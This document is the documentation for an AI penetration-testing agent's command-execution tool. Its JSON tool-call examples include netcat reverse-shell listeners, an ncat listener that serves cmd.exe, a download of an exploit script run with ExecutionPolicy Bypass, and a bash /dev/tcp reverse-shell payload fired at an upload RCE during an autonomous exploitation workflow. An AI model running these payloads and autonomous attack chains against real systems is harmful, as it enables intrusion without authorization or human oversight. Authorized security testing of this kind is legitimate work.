# AI Agent: Direct Command Execution

## Overview

The AI pentesting agent can now **execute system commands directly** on the attacker machine to set up environments, launch tools, and manage the testing workflow.

---

## 🎯 Command Execution Capability

### **execute_command** Tool

The AI can run commands on your local machine during penetration testing operations:

- **Linux/macOS**: Bash commands  
- **macOS**: Bash commands

---

## Cross-Platform Command Examples

### Windows (PowerShell)

#### Setup Netcat Listener
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "ncat.exe -lvnp 4444",
    "platform": "windows",
    "background": true
  },
  "reasoning": "Setting up reverse shell listener on port 4444"
}
```

#### Check Port Connectivity
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "Test-NetConnection -ComputerName target.com -Port 443",
    "platform": "windows"
  }
}
```

#### Download External Tool
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "Invoke-WebRequest -Uri https://example.com/exploit.ps1 -OutFile exploit.ps1",
    "platform": "windows"
  }
}
```

#### Run PowerShell Script
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "powershell -ExecutionPolicy Bypass -File .\\exploit.ps1",
    "platform": "windows"
  }
}
```

---

### Linux/macOS (Bash)

#### Setup Netcat Listener
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "nc -lvnp 4444",
    "platform": "linux",
    "background": true
  },
  "reasoning": "Background netcat listener for reverse shell"
}
```

#### Check Open Ports
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "nc -zv target.com 80 443 8080",
    "platform": "linux"
  }
}
```

#### Download Tool
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "wget https://github.com/tool/exploit.sh -O exploit.sh && chmod +x exploit.sh",
    "platform": "linux"
  }
}
```

#### Run Python Exploit
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "python3 exploit.py --target 10.0.0.1 --port 8080",
    "platform": "linux"
  }
}
```

#### Setup SSH Tunnel
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "ssh -L 8080:localhost:80 user@jumphost.com",
    "platform": "linux",
    "background": true
  }
}
```

---

## Tactical Use Cases

### 1. Listener Setup (All Platforms)

**Scenario**: AI generates payload, needs listener ready

**Windows**:
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "ncat.exe -lvnp 4444 -e cmd.exe",
    "platform": "windows",
    "background": true
  }
}
```

**Linux**:
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "nc -lvnp 4444",
    "platform": "linux",
    "background": true
  }
}
```

---

### 2. Environment Preparation

**Check if Metasploit is available**:
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "which msfconsole",
    "platform": "linux"
  }
}
```

**Check if Nmap is available (Windows)**:
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "Get-Command nmap.exe",
    "platform": "windows"
  }
}
```

---

### 3. External Tool Integration

**Run Nmap scan**:
```bash
# Linux
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "nmap -sV -p- target.com -oX scan_results.xml",
    "platform": "linux",
    "timeout": 300
  }
}
```

**Run Nikto scan**:
```bash
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "nikto -h https://target.com -Format json -output nikto.json",
    "platform": "linux"
  }
}
```

---

### 4. File Operations

**Windows - Create exploit directory**:
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "New-Item -ItemType Directory -Path C:\\exploits -Force",
    "platform": "windows"
  }
}
```

**Linux - Create workspace**:
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "mkdir -p /tmp/pentest && cd /tmp/pentest",
    "platform": "linux"
  }
}
```

---

### 5. Network Testing

**Windows - Test connectivity**:
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "Test-Connection -ComputerName target.com -Count 3",
    "platform": "windows"
  }
}
```

**Linux - Check route**:
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "traceroute -m 20 target.com",
    "platform": "linux"
  }
}
```

---

## Parameters

### Required
- **`cmd`**: Command string to execute
- **`platform`**: Target platform (`"windows"`, `"linux"`, or `"macos"`)

### Optional
- **`timeout`**: Command timeout in seconds (default: 30)
- **`background`**: Run as background process (default: false)

---

## Response Format

### Foreground Command (Completed)
```json
{
  "status": "completed",
  "exit_code": 0,
  "stdout": "Command output here...",
  "stderr": "",
  "command": "nc -lvnp 4444",
  "platform": "linux"
}
```

### Background Command (Started)
```json
{
  "status": "started",
  "pid": 12345,
  "command": "nc -lvnp 4444",
  "platform": "linux",
  "message": "Background process started (PID: 12345)"
}
```

### Error Response
```json
{
  "error": "Command execution failed: Permission denied",
  "command": "nc -lvnp 80",
  "platform": "linux"
}
```

---

## AI Decision Flow Example

### Full Exploitation Workflow

**Iteration 1-3: Reconnaissance**
```
→ recon (DNS enum, subdomains)
→ os_fingerprint (Detects: Linux Ubuntu 20.04)
→ tech_detect (Detects: Apache/2.4.41, PHP/7.4)
```

**Iteration 4-7: Scanning & Enumeration**
```
→ port_scan (Finds: 22, 80, 443, 3306)
→ crawler (Discovers: /admin, /api, /upload.php)
→ web_pentest (Finds: RCE in /upload.php)
```

**Iteration 8: Listener Setup**
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "nc -lvnp 4444",
    "platform": "linux",
    "background": true
  },
  "reasoning": "Setting up listener before payload generation"
}
```

**Iteration 9: Payload Generation**
```json
{
  "next_action": "payload_generate",
  "parameters": {
    "lhost": "10.0.0.5",
    "lport": 4444,
    "shell": "bash"
  },
  "reasoning": "Linux target detected, generating bash reverse shell"
}
```

**Iteration 10: Exploitation**
```json
{
  "next_action": "exploit_vuln",
  "parameters": {
    "vulnerability": "RCE via unrestricted file upload",
    "payload": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
  },
  "reasoning": "Executing payload against upload.php vulnerability"
}
```

---

## Security Considerations

### ⚠️ Command Validation
- Commands run with **current user privileges**
- No automatic privilege escalation
- Validates platform compatibility before execution

### 🔒 Risk Management
- **Background processes**: Used for listeners (non-blocking)
- **Foreground processes**: Used for immediate results (blocking)
- **Timeout limits**: Prevents hung processes (default: 30s)

### 📋 Logging
All executed commands are logged as findings:
```json
{
  "tool": "execute_command",
  "severity": "info",
  "category": "command_execution",
  "description": "Executed command on linux: nc -lvnp 4444",
  "details": {
    "status": "started",
    "pid": 12345,
    "platform": "linux"
  }
}
```

---

## Usage in AI Agent

### Test with Command Execution

**Windows**:
```powershell
$env:SCORPION_AI_API_KEY = "local"

scorpion ai-pentest `
  -t target.com `
  --ai-provider custom `
  --api-endpoint http://localhost:11434/api/chat `
  --model gpt-oss:120b-cloud `
  --primary-goal web_exploitation `
  --risk-tolerance high `
  --max-iterations 20
```

**Linux/macOS**:
```bash
export SCORPION_AI_API_KEY="local"

scorpion ai-pentest \
  -t target.com \
  --ai-provider custom \
  --api-endpoint http://localhost:11434/api/chat \
  --model gpt-oss:120b-cloud \
  --primary-goal web_exploitation \
  --risk-tolerance high \
  --max-iterations 20
```

The AI will automatically use `execute_command` when needed:
- Setup listeners before generating payloads
- Check for required tools (nmap, nikto, etc.)
- Prepare exploit environments
- Launch external scanning tools
- Manage background processes

---

## Platform-Specific Commands

### Windows PowerShell Commands

| Purpose | Command |
|---------|---------|
| Check admin rights | `([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)` |
| List processes | `Get-Process` |
| Network connections | `Get-NetTCPConnection` |
| DNS lookup | `Resolve-DnsName target.com` |
| HTTP request | `Invoke-WebRequest -Uri https://target.com` |
| Base64 encode | `[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("payload"))` |

### Linux/macOS Bash Commands

| Purpose | Command |
|---------|---------|
| Check root | `id -u` (0 = root) |
| List processes | `ps aux` |
| Network connections | `netstat -tupln` or `ss -tupln` |
| DNS lookup | `dig target.com` or `nslookup target.com` |
| HTTP request | `curl -i https://target.com` |
| Base64 encode | `echo "payload" \| base64` |

---

## Best Practices

✅ **DO**:
- Use `background: true` for listeners
- Specify platform explicitly
- Set appropriate timeouts for long-running commands
- Use full paths for external tools

❌ **DON'T**:
- Run destructive commands without authorization
- Execute commands requiring interactive input
- Assume sudo/admin without checking
- Leave background processes orphaned

---

## Troubleshooting

### Command Not Found
**Problem**: Tool not in PATH
**Solution**: Use full path or check if tool is installed
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "/usr/bin/nmap --version",
    "platform": "linux"
  }
}
```

### Permission Denied
**Problem**: Insufficient privileges
**Solution**: Check current user permissions or request elevated access

### Timeout Exceeded
**Problem**: Command takes too long
**Solution**: Increase timeout or run in background
```json
{
  "next_action": "execute_command",
  "parameters": {
    "cmd": "nmap -p- target.com",
    "platform": "linux",
    "timeout": 600,
    "background": true
  }
}
```

---

## Integration with Kill Chain

The `execute_command` tool integrates seamlessly with the 6-phase kill chain:

1. **Reconnaissance**: Download wordlists, setup tools
2. **Scanning**: Run external scanners (nmap, masscan)
3. **Vulnerability Analysis**: Launch specialized tools (nikto, sqlmap)
4. **Exploitation**: Setup listeners, prepare exploit environment
5. **Post-Exploitation**: Maintain access, setup pivots
6. **Reporting**: Generate custom reports, archive findings

---

## Examples in Context

### Complete Attack Scenario

```python
# AI automatically executes:

# 1. Check environment
execute_command("which nc", platform="linux")

# 2. Setup listener
execute_command("nc -lvnp 4444", platform="linux", background=True)

# 3. Generate payload (bash for Linux)
payload_generate(lhost="10.0.0.5", lport=4444, shell="bash")

# 4. Exploit vulnerability
web_pentest(url="https://target.com/upload.php")

# 5. Verify connection
execute_command("netstat -an | grep 4444", platform="linux")
```

All automated, all logged, all secure. 🎯
